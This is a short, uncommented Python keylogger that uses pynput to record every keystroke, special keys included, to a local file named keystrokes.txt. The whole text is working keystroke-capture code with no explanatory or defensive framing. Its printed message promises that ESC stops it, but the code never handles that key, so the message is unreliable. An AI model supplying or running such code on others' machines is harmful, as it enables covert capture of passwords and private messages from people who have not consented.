from pynput import keyboard

log_file = "keystrokes.txt"

def write_to_file(key):
    with open(log_file, "a") as file:
        file.write(key + "\n")

def on_press(key):
    try:
        write_to_file(f"Key pressed: {key.char}")
    except AttributeError:
        write_to_file(f"Special key pressed: {key}")

def start_keylogger():
    print("Keylogger is running. Press ESC to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_keylogger()
